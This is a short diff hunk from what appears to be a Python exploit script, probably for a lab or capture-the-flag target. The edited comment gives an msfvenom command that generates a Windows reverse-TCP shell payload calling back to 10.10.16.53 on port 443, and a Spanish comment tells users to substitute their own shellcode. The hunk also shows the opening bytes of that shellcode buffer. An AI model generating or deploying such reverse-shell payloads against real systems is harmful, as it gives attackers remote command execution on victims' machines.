@@ -36,7 +36,7 @@ class Exploit():
 		);
 		"""
 		
-		# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.53 lport=443 EXITFUNC=thread -f py 
+		# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.53 lport=443 EXITFUNC=thread -b '\x00' -f python
 		# Cambiar a vuestro shellcode
 		buf =  b""
     		buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x0c\x84\x35\xbe\x5a\x33"
